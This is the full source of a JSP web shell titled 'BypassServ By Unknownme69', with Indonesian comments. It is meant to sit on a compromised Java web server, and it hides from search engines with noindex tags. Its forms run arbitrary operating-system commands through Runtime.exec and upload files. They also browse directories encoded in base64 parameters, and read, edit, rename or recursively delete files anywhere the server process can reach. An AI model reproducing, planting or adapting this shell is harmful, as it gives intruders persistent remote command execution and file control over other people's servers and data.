<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.*" %>
<%@ page import="java.nio.file.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.text.SimpleDateFormat" %>
<%@ page import="org.apache.commons.codec.binary.Base64" %>
<!DOCTYPE html>
<html>
<head>
    <title>BypassServ By Unknownme69</title>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <link href="https://fonts.googleapis.com/css?family=Arial%20Black" rel="stylesheet">
    <style>
    body {
        font-family: 'Arial Black', sans-serif;
        color: #000;
        margin: 0;
        padding: 0;
        background-color: #242222c9;
    }
    .result-box-container {
        position: relative;
        margin-top: 20px;
    }

    .result-box {
        width: 100%;
        height: 200px;
        padding: 10px;
        border: 1px solid #ddd;
        border-radius: 5px;
        background-color: #f4f4f4;
        overflow: auto;
        box-sizing: border-box;
        font-family: 'Arial Black', sans-serif;
        color: #333;
    }

    .result-box::placeholder {
        color: #999;
    }

    .result-box:focus {
        outline: none;
        border-color: #000000;
    }

    .result-box::-webkit-scrollbar {
        width: 8px;
    }

    .result-box::-webkit-scrollbar-thumb {
        background-color: #000000;
        border-radius: 4px;
    }
    .container {
        max-width: 90%;
        margin: 20px auto;
        padding: 20px;
        background-color: #ffffff;
        border-radius: 44px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    .header {
        text-align: center;
        margin-bottom: 20px;
    }
    .header h1 {
        font-size: 24px;
    }
    .subheader {
        text-align: center;
        margin-bottom: 20px;
    }
    .subheader p {
        font-size: 16px;
        font-style: italic;
    }
    form {
        margin-bottom: 20px;
    }
    form input[type="text"],
    form textarea {
        padding: 8px;
        margin-bottom: 10px;
        border: 1px solid #000;
        border-radius: 3px;
        box-sizing: border-box;
        
    }
    form input[type="submit"] {
        padding: 10px;
        background-color: #000000;
        color: white;
        border: none;
        border-radius: 3px;
        cursor: pointer;
    }
    form input[type="file"] {
        padding: 7px;
        background-color: #000000;
        color: white;
        border: none;
        border-radius: 3px;
        cursor: pointer;
    }
    .result-box {
            width: 100%;
            height: 200px;
            resize: none;
            overflow: auto;
            font-family: 'Arial Black';
            background-color: #f4f4f4;
            padding: 10px;
            border: 1px solid #ddd;
            margin-bottom: 10px;
        }
    form input[type="submit"]:hover {
        background-color: #143015;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        margin-top: 20px;
    }
    th, td {
        padding: 8px;
        text-align: left;
    }
    th {
        background-color: #5c5c5c;
    }
    tr:nth-child(even) {
        background-color: #9c9b9bce;
    }
    .item-name {
        max-width: 200px;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
    }
    .size, .date {
        width: 100px;
    }
    .permission {
        font-weight: bold;
        width: 50px;
        text-align: center;
    }
    .writable {
        color: #0db202;
    }
    .not-writable {
        color: #d60909;
    }
    textarea[name="file_content"] {
            width: calc(100.9% - 10px);
            margin-bottom: 10px;
            padding: 8px;
            max-height: 500px;
            resize: vertical;
            border: 1px solid #ddd;
            border-radius: 3px;
            font-family: 'Arial Black';
        }
</style>
</head>
<body>
<div class="container">
<%
// Utility functions - menggunakan method static
public static String encodeBase64(String b) {
    return Base64.encodeBase64String(b.getBytes());
}

public static String decodeBase64(String b) {
    return new String(Base64.decodeBase64(b));
}

public static boolean deleteDirectory(File dir) {
    if (!dir.exists()) {
        return true;
    }
    if (!dir.isDirectory()) {
        return dir.delete();
    }
    
    File[] files = dir.listFiles();
    if (files != null) {
        for (File file : files) {
            if (file.isDirectory()) {
                deleteDirectory(file);
            } else {
                file.delete();
            }
        }
    }
    return dir.delete();
}

// Decode GET parameters
Enumeration<String> paramNames = request.getParameterNames();
while (paramNames.hasMoreElements()) {
    String paramName = paramNames.nextElement();
    String paramValue = request.getParameter(paramName);
    if (paramValue != null && !paramValue.isEmpty()) {
        try {
            request.setAttribute("decoded_" + paramName, decodeBase64(paramValue));
        } catch (Exception e) {
            request.setAttribute("decoded_" + paramName, paramValue);
        }
    }
}

String rootDirectory = System.getProperty("user.dir");
String scriptDirectory = new File(request.getServletContext().getRealPath(request.getServletPath())).getParent();

String currentDirectory = rootDirectory;
if (request.getAttribute("decoded_d") != null) {
    currentDirectory = (String) request.getAttribute("decoded_d");
}

String viewCommandResult = "";

if ("POST".equalsIgnoreCase(request.getMethod())) {
    try {
        // File Upload
        Part filePart = request.getPart("fileToUpload");
        if (filePart != null && filePart.getSize() > 0) {
            String fileName = Paths.get(filePart.getSubmittedFileName()).getFileName().toString();
            String targetFile = currentDirectory + File.separator + fileName;
            
            try (InputStream fileContent = filePart.getInputStream()) {
                Files.copy(fileContent, Paths.get(targetFile), StandardCopyOption.REPLACE_EXISTING);
                out.println("<hr>File " + fileName + " Upload success<hr>");
            } catch (Exception e) {
                out.println("<hr>Sorry, there was an error uploading your file.<hr>");
            }
        }
        
        // Create Folder
        String folderName = request.getParameter("folder_name");
        if (folderName != null && !folderName.isEmpty()) {
            File newFolder = new File(currentDirectory + File.separator + folderName);
            if (!newFolder.exists()) {
                if (newFolder.mkdir()) {
                    out.println("<hr>Folder created successfully!<hr>");
                } else {
                    out.println("<hr>Error: Failed to create folder!<hr>");
                }
            }
        }
        
        // Create File
        String fileName = request.getParameter("file_name");
        if (fileName != null && !fileName.isEmpty()) {
            File newFile = new File(currentDirectory + File.separator + fileName);
            if (!newFile.exists()) {
                try (FileWriter writer = new FileWriter(newFile)) {
                    writer.write("");
                    out.println("<hr>File created successfully! " + fileName + "<hr>");
                    
                    // View the created file
                    if (newFile.exists()) {
                        String fileContent = new String(Files.readAllBytes(newFile.toPath()));
                        viewCommandResult = "<hr><p>Result: " + fileName + "</p>" +
                            "<form method=\"post\" action=\"?" + request.getQueryString() + "\">" +
                            "<textarea name=\"content\" class=\"result-box\">" + fileContent + "</textarea>" +
                            "<input type=\"hidden\" name=\"edit_file\" value=\"" + fileName + "\">" +
                            "<input type=\"submit\" value=\" Save \"></form>";
                    }
                } catch (Exception e) {
                    out.println("<hr>Error: Failed to create file!<hr>");
                }
            } else {
                out.println("<hr>Error: File Already Exists!<hr>");
            }
        }
        
        // Command Execution
        String cmdInput = request.getParameter("cmd_input");
        if (cmdInput != null && !cmdInput.isEmpty()) {
            String meterpreter = Base64.encodeBase64String((cmdInput + " > test.txt").getBytes());
            viewCommandResult = "<hr><p>Result: <font color=\"black\">base64 : " + meterpreter + 
                "</font><br>Please Refresh and Check File test.txt, this output command<br>" +
                "test.txt created = VULN<br>test.txt not created = NOT VULN<br>" +
                "example access: domain.com/yourpath/path/test.txt<br>Powered By Unknownme69</font><br><br>";
        }
        
        // Regular Command Execution
        String cmdBiasa = request.getParameter("cmd_biasa");
        if (cmdBiasa != null && !cmdBiasa.isEmpty()) {
            try {
                Process process = Runtime.getRuntime().exec(cmdBiasa);
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                
                StringBuilder output = new StringBuilder();
                StringBuilder errors = new StringBuilder();
                
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                while ((line = errorReader.readLine()) != null) {
                    errors.append(line).append("\n");
                }
                
                process.waitFor();
                reader.close();
                errorReader.close();
                
                if (errors.length() > 0) {
                    viewCommandResult = "<hr><p>Error: </p><textarea class=\"result-box\">" + errors.toString() + "</textarea>";
                } else {
                    viewCommandResult = "<hr><p>Result: </p><textarea class=\"result-box\">" + output.toString() + "</textarea>";
                }
            } catch (Exception e) {
                viewCommandResult = "<hr><p>Result:</p><textarea class=\"result-box\">Error: Failed to execute command! " + e.getMessage() + "</textarea>";
            }
        }
        
        // Delete File/Folder
        String deleteFile = request.getParameter("delete_file");
        if (deleteFile != null && !deleteFile.isEmpty()) {
            File fileToDelete = new File(currentDirectory + File.separator + deleteFile);
            if (fileToDelete.exists()) {
                if (fileToDelete.isDirectory()) {
                    if (deleteDirectory(fileToDelete)) {
                        out.println("<hr>Folder deleted successfully!<hr>");
                    } else {
                        out.println("<hr>Error: Failed to delete folder!<hr>");
                    }
                } else {
                    if (fileToDelete.delete()) {
                        out.println("<hr>File deleted successfully!<hr>");
                    } else {
                        out.println("<hr>Error: Failed to delete file!<hr>");
                    }
                }
            } else {
                out.println("<hr>Error: File or directory not found!<hr>");
            }
        }
        
        // Rename Item
        String oldName = request.getParameter("old_name");
        String newName = request.getParameter("new_name");
        if (oldName != null && newName != null && !oldName.isEmpty() && !newName.isEmpty()) {
            File oldFile = new File(currentDirectory + File.separator + oldName);
            File newFile = new File(currentDirectory + File.separator + newName);
            if (oldFile.exists()) {
                if (oldFile.renameTo(newFile)) {
                    out.println("<hr>Item renamed successfully!<hr>");
                } else {
                    out.println("<hr>Error: Failed to rename item!<hr>");
                }
            } else {
                out.println("<hr>Error: Item not found!<hr>");
            }
        }
        
        // View File
        String viewFile = request.getParameter("view_file");
        if (viewFile != null && !viewFile.isEmpty()) {
            File fileToView = new File(currentDirectory + File.separator + viewFile);
            if (fileToView.exists()) {
                String fileContent = new String(Files.readAllBytes(fileToView.toPath()));
                viewCommandResult = "<hr><p>Result: " + viewFile + "</p>" +
                    "<form method=\"post\" action=\"?" + request.getQueryString() + "\">" +
                    "<textarea name=\"content\" class=\"result-box\">" + fileContent + "</textarea>" +
                    "<input type=\"hidden\" name=\"edit_file\" value=\"" + viewFile + "\">" +
                    "<input type=\"submit\" value=\" Save \"></form>";
            } else {
                viewCommandResult = "<hr><p>Error: File not found!</p>";
            }
        }
        
        // Edit File
        String editFile = request.getParameter("edit_file");
        String content = request.getParameter("content");
        if (editFile != null && content != null) {
            File fileToEdit = new File(currentDirectory + File.separator + editFile);
            try (FileWriter writer = new FileWriter(fileToEdit)) {
                writer.write(content);
                out.println("<hr>File Edited successfully! " + editFile + "<hr>");
            } catch (Exception e) {
                out.println("<hr>Error: Failed Edit File! " + editFile + "<hr>");
            }
        }
        
    } catch (Exception e) {
        out.println("<hr>Error processing request: " + e.getMessage() + "<hr>");
    }
}
%>

<font color='black'>[ Command Bypass Status - JSP Version]</font><br>
<font color='black'>[ Runtime Execution ] :</font><font color='green'> [ AVAILABLE ]</font><br>

<hr>DIR: <%
    String[] directories = currentDirectory.split(File.separator.equals("\\") ? "\\\\" : File.separator);
    String currentPath = "";
    for (int i = 0; i < directories.length; i++) {
        if (directories[i].isEmpty()) continue;
        currentPath += File.separator + directories[i];
        if (i == 0) {
            out.print("/<a href=\"?d=" + encodeBase64(currentPath) + "\">" + directories[i] + "</a>");
        } else {
            out.print("/<a href=\"?d=" + encodeBase64(currentPath) + "\">" + directories[i] + "</a>");
        }
    }
%>
<a href="?d=<%= encodeBase64(scriptDirectory) %>"> / <span style="color: green;">[ GO Home ]</span></a>
<br>

<hr>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="fileToUpload" id="fileToUpload" placeholder="pilih file:">
    <input type="submit" value="Upload File" name="submit">
</form>
<hr>

<table border="5">
    <tbody>
        <tr>
            <td>
                <center>Command BYPASS
                <form method="post" action="?<%= request.getQueryString() != null ? request.getQueryString() : "" %>">
                    <input type="text" name="cmd_input" placeholder="Enter command">
                    <input type="submit" value="Run Command">
                </form>
                </center>
            </td>
            <td>
                <center>Command BIASA
                <form method="post" action="?<%= request.getQueryString() != null ? request.getQueryString() : "" %>">
                    <input type="text" name="cmd_biasa" placeholder="Enter command">
                    <input type="submit" value="Run Command">
                </form>
                </center>
            </td>
            <td>
                <center>Create Folder
                <form method="post" action="?<%= request.getQueryString() != null ? request.getQueryString() : "" %>">
                    <input type="text" name="folder_name" placeholder="Folder Name">
                    <input type="submit" value="Create Folder">
                </form>
                </center>
            </td>
            <td>
                <center>Create File
                <form method="post" action="?<%= request.getQueryString() != null ? request.getQueryString() : "" %>">
                    <input type="text" name="file_name" placeholder="File Name">
                    <input type="submit" value="Create File">
                </form>
                </center>
            </td>
        </tr>
    </tbody>
</table>

<%= viewCommandResult %>

<table border=1>
    <tr>
        <th><center>Item Name</center></th>
        <th><center>Size</center></th>
        <th><center>Date</center></th>
        <th>Permissions</th>
        <th><center>View</center></th>
        <th><center>Delete</center></th>
        <th><center>Rename</center></th>
    </tr>
    
<%
    File currentDir = new File(currentDirectory);
    File[] files = currentDir.listFiles();
    SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    
    if (files != null) {
        for (File file : files) {
            String itemName = file.getName();
            String itemLink = file.isDirectory() ? 
                "?d=" + encodeBase64(currentDirectory + File.separator + itemName) : 
                "?d=" + encodeBase64(currentDirectory) + "&f=" + encodeBase64(itemName);
            
            String permissions = "";
            if (file.canRead()) permissions += "r";
            if (file.canWrite()) permissions += "w";
            if (file.canExecute()) permissions += "x";
            
            boolean writable = file.canWrite();
%>
    <tr>
        <td class="item-name"><a href="<%= itemLink %>"><%= itemName %></a></td>
        <td class="size"><%= file.length() %></td>
        <td class="date" style="text-align: center;"><%= dateFormat.format(new Date(file.lastModified())) %></td>
        <td class="permission <%= writable ? "writable" : "not-writable" %>"><%= permissions %></td>
        <td>
            <center>
            <form method="post" action="?<%= request.getQueryString() != null ? request.getQueryString() : "" %>">
                <input type="hidden" name="view_file" value="<%= itemName %>">
                <input type="submit" value=" View ">
            </form>
            </center>
        </td>
        <td>
            <center>
            <form method="post" action="?<%= request.getQueryString() != null ? request.getQueryString() : "" %>">
                <input type="hidden" name="delete_file" value="<%= itemName %>">
                <input type="submit" value="Delete">
            </form>
            </center>
        </td>
        <td>
            <form method="post" action="?<%= request.getQueryString() != null ? request.getQueryString() : "" %>">
                <input type="hidden" name="old_name" value="<%= itemName %>">
                <input type="text" name="new_name" placeholder="New Name">
                <input type="submit" name="rename_item" value="Rename">
            </form>
        </td>
    </tr>
<%
        }
    }
%>
</table>

</div>
</body>
</html>
